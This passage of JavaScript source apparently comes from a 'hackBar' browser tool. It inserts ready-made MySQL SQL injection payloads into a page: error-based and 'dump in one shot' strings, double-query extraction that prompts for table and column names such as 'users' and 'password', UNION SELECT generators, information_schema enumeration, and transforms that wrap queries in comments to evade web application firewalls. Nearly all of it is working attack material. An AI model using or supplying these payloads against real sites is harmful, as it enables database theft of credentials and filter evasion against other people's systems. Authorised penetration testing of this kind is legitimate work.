			case '7':
					txt = "+POLYGON((select*from(select*from(select+group_concat(table_name+separator+0x3c62723e)+from+information_schema.tables+where+table_schema=database())f)x))";
					break;
			/*Error Based for MySQL Version 5.5 , 5.6 ...  / Maria_db*/
			case '8':
					txt = "and(select!x-~0.+from(select(select+group_concat(Version()))x)x)";
					break;
			case '9':
					txt = "and(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
					break;
			/*DIOS By MadBlood for MySQL Version 5.5 , 5.6 ...  / Maria_db*/
			case '10':
					txt = "(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@)x)y)";
					break;
			case '11':
					txt = "(select(x+is+not+null)-9223372036854775808+from(select(concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@))x)y)";
					break;
			case '12':
					txt = "(select!x-~0+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)";
					break;
			case '13':
					txt = "(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
					break;
			case '14':
					txt = "(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
					break;
			case '15':
					txt = "(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
					break;
			case '16':
					txt = "and(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
					break;
			case '17':
					txt = "and(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
					break;
			case '18':
					txt = "and(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)";
					break;
			/*DIOS By MadBlood for MySQL Version < 5.5 */
			case '19':
					txt = "+multipoint((select*from+(select+x*1E308+from+(select+concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)j))";
					break;
			case '20':
					txt = "+multipoint((select*from(select(!x-~0)+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)j))";
					break;
			case '21':
					txt = "multipoint((select*from(select(x+is+not+null)-9223372036854775808+from+(select(concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@))x)y)j))";
					break;
			case '22':
					txt = "'+and+multipoint((select*from(select!x-~0.from(select(select+group_concat(table_name+separator+0x0b)from(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,20)c)x)j)h))";
					break;
			default:
                    txt = "ERROR";
                    break;
		} 		
		hackBar.setSelectedText( txt ); 
	},
	/* DOUBLE QUERY FUNCTION */
    DoubleQuery: function (choice)	{
		var str = choice;
		switch (str){  
            case '1':
                    txt = "+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+CONCAT(CAST(VERSION()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;   
            case '2':
                    txt = "+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(schema_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.SCHEMATA+WHERE+table_schema!=DATABASE()+LIMIT+1,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),+FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;     
            case '3':
                    var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{                 
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    txt = "+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(table_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" + dbNameFinal + "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;      
            case '4':
                    var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{       
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tblName = prompt("Table Name", "users");
                    var tblNameHex = "";       
                    for (var i = 0; i < tblName.length; i++){
                      tblNameHex += tblName.charCodeAt(i).toString(16);
                    }
                    txt = "+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(column_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_schema=" + dbNameFinal + "+AND+table_name=0x" + tblNameHex + "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;
            default:
                    txt = "ERROR";
                    break;
			case '5':
			
                    var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
					if(Db == ""){dbANDtable=tableName;}
					if(Db == "DATABASE()"){dbANDtable=tableName;}
					else{
					dbANDtable=Db + "." + tableName;					
					}
                    var columnName = prompt("Column Name", "password");                   
                    
                    txt = "+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(" + columnName +"+AS+CHAR),0x27,0x7e)+FROM+" + dbANDtable + "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;
        } 	               
		hackBar.setSelectedText( txt ); 
	  },
	/* T.PRO GENERATE UNION (THX TO AJKARO FOR REPEAT NULL STRING FIX!!!)*/
	UnionSelectGen: function (choice){		
	  var str = choice;
	  switch (str){					
			case '1':  
				var amount = prompt( "Amount of columns to use in the UNION SELECT Statement", "10" );
				txt = "+UNION+ALL+SELECT+";	
				var strNull = 'null,';					
				function multiString(text, count){ var ret = ""; for(var i = 0; i < count; i++){ret += text; }
					return ret;
				  };
				  var rep = multiString(strNull, amount);					 
				  txt = txt + rep.substr(0, rep.length-1)+"--+-";					
				  break;			
		 default: txt = "ERROR";
				  break;					
	  } 		
	  hackBar.setSelectedText( txt ); 
	},
	selectionToUnion2: function ( encoding ){
		var columns = prompt( "Amount of columns to use in the UNION ALL SELECT Statement", "10" );
		columns = Math.min(1000, parseInt( columns ));
		var colArray = new Array();
		for ( var i = 0 ; i < columns ; i++ ) {
		  colArray.push( i+1 );
    }
	result = colArray.join( '),(' );
	txt = "+UNION(SELECT(" + result + ")" + ")";	
    hackBar.setSelectedText( txt );
	},
	/* SELECT QUERIES */
    SelectQueries: function (choice)	{		
		var str = choice;
		switch (str){		
			case '1':  txt = "(SELECT+CONCAT(COUNT(schema_name),0x202f20446174616261736573)+FROM+INFORMATION_SCHEMA.SCHEMATA)";			
					break;
			case '2':  txt = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";			
					break;			
			case '3':					
                    txt = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
                    break;
			case '4':					
                    txt = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)";
                    break;
            case '5':
                    txt = "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())"; 
                    break;	
			case '6':
					var tblName = prompt("Table Name", "users");					
                    var tblNameHex = "";       
                    for (var i = 0; i < tblName.length; i++){
                      tblNameHex += tblName.charCodeAt(i).toString(16);
                    }
                    txt = "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x" + tblNameHex + ")"; 
                    break;
			case '7':
                    txt = "(/*!%53ELECT*/(@x)FROM(/*!%53ELECT*/(@x:=0x00),(@NR:=0),(/*!%53ELECT*/(0)/*!%46ROM*/(/*!%49NFORMATION_%53CHEMA*/./*!%54ABLES*/)/*!%57HERE*/(/*!%54ABLE_%53CHEMA*//**/NOT/**/LIKE/**/0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=/*!CONCAT%0a(*/@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,/*!%74able_%6eame*/,0x3c62723e))))x)"; 
                    break;	
			case '8':
					var tblName = prompt("Table Name", "users");					
                    var tblNameHex = "";       
                    for (var i = 0; i < tblName.length; i++){
                      tblNameHex += tblName.charCodeAt(i).toString(16);
                    }
                    txt = "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x" + tblNameHex + ")"; 
                    break;		} 		
		hackBar.setSelectedText( txt ); 
	  },
	/* BASICS OTHER */
    OtherBasics: function (choice)	{		
		var str = choice;
		switch (str){		
			case '1':  
					var txt = hackBar.getSelectedText();
					if( txt == ''){
					var txt = "LPAD(str,2,0x30)";					
					}else{
					var txt = "LPAD(" + txt + ",2,0x30)";					
					};								
					break;
			case '2':  
					var txt = hackBar.getSelectedText();
					if( txt == ''){
					var txt = "REPEAT(str,count)";					
					}else{
					var txt = "REPEAT(" + txt + ",5)";					
					};						
					break;			
			case '3':
					var txt = hackBar.getSelectedText();
					if( txt == ''){
					var txt = "IF((CONDITION)>-1,0x00,0x00)";					
					}else{
					var txt = "IF((" + txt + ")>-1,0x00,0x00)";					
					};                  
                    break;
			case '4':	
					var txt = hackBar.getSelectedText();
					if( txt == ''){
					var txt = "CASE+WHEN+(CONDITION)+THEN+1+ELSE+2+END";					
					}else{
					var txt = "CASE+WHEN+(" + txt + ")+THEN+1+ELSE+2+END";	
					}; 	
                    break;
            default:
                    txt = "ERROR";
                    break;					
		} 		
		hackBar.setSelectedText( txt ); 
	  },	  
	/* T.PRO WAF CALCULATE  */
	CalcWaf: function (choice)
	  {
		var txt = hackBar.getSelectedText();				
		var str = choice;
		switch (str){
			case '1': txt = txt.replace(/ /g, "/**/");
				txt= ("/*!" + txt + "*/");
					break;
			case '2': txt = txt.replace(/ /g, "+");
				txt= ("/*!50000" + txt + "*/");
					break;
			case '3': txt = txt.replace(/ /g, "+");
				txt= ("/*!12345" + txt + "*/");
					break;
			case '4': txt = txt.replace(/ /g, "+");
				txt= ("/*!13337" + txt + "*/");
					break;	
			case '5': var txt = txt.toLowerCase();
				String.prototype.insert = new Function('intPos','strIns','return this.substring(0,intPos) + strIns + this.substring(intPos,this.length);');  	
				var input2val = txt.toUpperCase();  
				txt = (txt.insert(2,input2val));
				txt = txt.replace(/ /g, "/*&a=*/");
					break;
		// SETS
		case '6': var txt = txt.toLowerCase();
				String.prototype.insert = new Function('intPos','strIns','return this.substring(0,intPos) + strIns + this.substring(intPos,this.length);');  	
				var input2val = txt.toUpperCase();  
				txt = (txt.insert(2,input2val));
				txt = txt.replace(/ /g, "/*&a=*/");
					break;
		} 		
		hackBar.setSelectedText( txt );
	  }
}